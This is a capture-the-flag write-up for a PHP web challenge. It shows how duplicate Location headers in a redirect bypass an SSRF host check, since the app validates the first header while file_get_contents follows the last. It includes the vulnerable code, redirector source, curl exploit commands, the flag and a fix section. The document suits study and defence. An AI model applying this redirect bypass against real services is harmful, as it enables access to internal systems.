# get-file2

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Points | 308 |
| Author | 夜有夢 |
| Connection | `http://chal.thjcc.org:8082/` |
| Handout | [`artifacts/`](artifacts/) (full docker-compose source) |
| Interactive writeup | [First vs Last — one response, two readers](https://claude.ai/code/artifact/a80b8dd0-5345-4fe0-9819-0722e6b345a4) |
| Flag | `THJCC{PHP_stream_30x_DuAl_65de4980cf}` |

## TL;DR

The sequel to [get-file1](../get-file1/README.md). The case-sensitivity trick is
patched — `file.php` now matches the redirect header **case-insensitively** — so
this one is a **duplicate-`Location`-header parser differential**. The app
validates the **first** `Location` header of a redirect, but the fetch that
actually follows it (`file_get_contents` with the default `follow_location=true`)
obeys the **last** one, because PHP's HTTP wrapper overwrites its target on every
`Location:` line. The redirector's `/a` sends two — a safe host first, the flag
host last — so validation and navigation disagree:

```
GET /file.php?u=http://r/a   →   THJCC{PHP_stream_30x_DuAl_65de4980cf}
```

## 1. What Changed Since get-file1

Same three-service layout (public PHP `w`, redirector `r`, internal flag `f`
aliased `flag.thjcc`), same flag service that only answers to `Host: flag.thjcc`
+ `/flag.txt`. What changed is the fetcher and the redirector.

`src/file.php` (reformatted):

```php
function a($s){                                     // unchanged allow-check
  $p = parse_url($s);
  return $p && isset($p['scheme'],$p['host'])
      && in_array(strtolower($p['scheme']), ['http','https'], true)
      && strtolower(rtrim($p['host'],'.')) !== 'flag.thjcc';
}

function b($s){
  if (!a($s)) throw new Exception();

  // (1) read headers WITHOUT following redirects
  $c = stream_context_create(['http'=>['follow_location'=>false,'timeout'=>3,'ignore_errors'=>true]]);
  $h = @get_headers($s, false, $c);

  // (2) case-INSENSITIVE now (get-file1's lowercase bypass is dead),
  //     but it takes the FIRST match and break-s
  $n = null;
  foreach ($h ?: [] as $v)
    if (preg_match('/^Location:/i', $v)) { $n = trim(substr($v, strpos($v,':')+1)); break; }

  // (3) re-check only that first Location
  if ($n !== null && !a($n)) throw new Exception();

  // (4) fetch $s again -- context has NO follow_location, so it defaults to TRUE
  $c = stream_context_create(['http'=>['timeout'=>3,'ignore_errors'=>true]]);
  $x = @file_get_contents($s, false, $c);
  if ($x === false) throw new Exception();
  return $x;
}
```

Two facts set up the bug:

- **The check reads the first `Location` and stops** (`break`).
- **The fetch follows redirects on its own** — the second context omits
  `follow_location`, so PHP uses its default of `1` (follow). Crucially it fetches
  the **original** `$s`, not the validated `$n`; the redirect is re-parsed and
  re-followed entirely inside `file_get_contents`.

## 2. Two Parsers, One Response — Which `Location` Wins?

The redirector hands us a response with **duplicate** `Location` headers:

```python
# redirector/server.py
if self.path == '/a':
    self.send_response(302)
    self.send_header('Location', 'http://r/x')                 # 1st — safe host 'r'
    self.send_header('Location', 'http://flag.thjcc/flag.txt') # 2nd — the flag
    self.end_headers()
elif self.path == '/b':
    self.send_response(302)
    self.send_header('Location', 'http://flag.thjcc/flag.txt') # single -> app catches it
```

So the wire response for `/a` is:

```
HTTP/1.1 302 Found
Location: http://r/x
Location: http://flag.thjcc/flag.txt
```

Now the two consumers diverge:

| Consumer | Behaviour on duplicate `Location` | Result for `/a` |
| --- | --- | --- |
| `file.php` loop | takes the **first** match, then `break` | `$n = http://r/x` → host `r` → **allowed** |
| PHP `file_get_contents` follower | copies `location` on **every** `Location:` line → **last** wins | follows `http://flag.thjcc/flag.txt` |

PHP's HTTP stream wrapper does, per response header line:

```c
} else if (!strncasecmp(http_header_line, "Location:", sizeof("Location:")-1)) {
    strlcpy(location, http_header_line + sizeof("Location:")-1, sizeof(location));  // overwrite
}
```

Each `Location:` overwrites the previous — so with two of them, PHP follows the
**last**. The app blessed the **first**. The gap between "what we validated" and
"what we navigated to" is the entire vulnerability.

## 3. Walking the Exploit

`u=http://r/a`:

1. `a('http://r/a')` → host `r` → allowed.
2. `get_headers('http://r/a', follow_location=false)` → array containing both
   `Location:` lines in order.
3. The loop matches the **first**, `$n = http://r/x`, and breaks.
4. `a('http://r/x')` → host `r` ≠ `flag.thjcc` → **no throw**.
5. `file_get_contents('http://r/a')` with `follow_location=true` (default):
   PHP requests `/a`, sees both `Location` headers, keeps the **last**
   (`http://flag.thjcc/flag.txt`), follows it, and — requesting that literal
   host — sends `Host: flag.thjcc`.
6. The flag service sees `Host: flag.thjcc` + `/flag.txt` → **200 + flag**.

`/b` is the decoy: a single `Location: http://flag.thjcc/flag.txt` is exactly
what the app *does* catch → `a($n)` fails → `error`.

```bash
$ curl -s 'http://chal.thjcc.org:8082/file.php' --data-urlencode 'u=http://r/b' -G
error
$ curl -s 'http://chal.thjcc.org:8082/file.php' --data-urlencode 'u=http://r/a' -G
THJCC{PHP_stream_30x_DuAl_65de4980cf}
```

## 4. Solver

[`solve.py`](solve.py) is standard-library only:

```bash
python3 solve.py                       # defaults to the challenge URL
```

```
[*] u=http://r/b  (single Location, the trap): [HTTP 400] error
[*] u=http://r/a  (dual Location, the bypass): THJCC{PHP_stream_30x_DuAl_65de4980cf}

[+] flag: THJCC{PHP_stream_30x_DuAl_65de4980cf}
```

## Why It Works

- **Validate-first vs follow-last.** When a field can legally appear more than
  once, any check that inspects one occurrence while the action honours a
  different occurrence is exploitable. Here the app hard-codes "first + break";
  PHP hard-codes "last wins". Duplicate `Location` headers make those two
  policies point at different hosts.
- **The guard isn't on the same fetch as the danger.** `get_headers` (the
  inspection) and `file_get_contents` (the navigation) are independent requests
  that each parse the redirect on their own. A check must constrain the *exact*
  operation it protects, not a look-alike performed separately.
- **get-file1 → get-file2.** v1 was a *case* differential (`Location:` vs
  `location:`); patching it to case-insensitive left a *cardinality* differential
  (first vs last of many). Both are the same root cause: the security code and
  the HTTP engine disagree on how to read one header.

## The Fix

- **Disable redirects entirely and reject any 3xx**, or resolve the final URL
  with the *same* library call that will fetch it and validate the destination it
  actually reaches.
- **Reject responses with multiple `Location` headers** outright — a
  well-behaved server never sends two.
- **Validate the connection target, not a parsed string.** Re-resolve and pin the
  destination IP immediately before connecting, and deny internal ranges — never
  authorize on a hostname the response can duplicate or vary.

## Flag

```text
THJCC{PHP_stream_30x_DuAl_65de4980cf}
```
